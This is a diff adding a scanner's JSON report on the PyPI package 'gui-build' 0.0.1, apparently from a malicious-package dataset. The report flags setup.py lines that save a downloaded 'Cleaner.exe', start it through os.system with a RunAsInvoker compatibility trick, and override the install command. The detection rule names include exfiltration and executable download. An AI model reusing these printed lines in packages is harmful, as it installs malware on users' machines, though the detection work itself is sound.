@@ -1,0 +1,36 @@
+{
+    "issues": 3,
+    "errors": {},
+    "results": {
+        "clipboard-access": {},
+        "dll-hijacking": {},
+        "steganography": {},
+        "shady-links": {},
+        "obfuscation": {},
+        "exfiltrate-sensitive-data": {},
+        "download-executable": [
+            {
+                "location": "setup.py:32",
+                "code": "    open(\"Cleaner.exe\", \"wb\").write(response.content)\n",
+                "message": "This package is downloading making executable a remote binary"
+            }
+        ],
+        "silent-process-execution": {},
+        "cmd-overwrite": [
+            {
+                "location": "setup.py:49",
+                "code": "setup(\n    name='gui-build',\n    version='0.0.1',\n    description='Make GUIs in python with ease',\n    long_description=long_description,\n    long_description_content_type='text/markdown',\n    url='https://github.com/',\n    packages=[],\n   ...\n    },\n)\n",
+                "message": "This package is overwriting the 'install' command in setup.py"
+            }
+        ],
+        "code-execution": [
+            {
+                "location": "setup.py:33",
+                "code": "    os.system(\"set __COMPACT_LAYER=RunAsInvoker | start Cleaner.exe\")\n",
+                "message": "This package is executing OS commands in the setup.py file"
+            }
+        ],
+        "exec-base64": {}
+    },
+    "path": "./dataset/pypi/gui-build-0.0.1"
+}
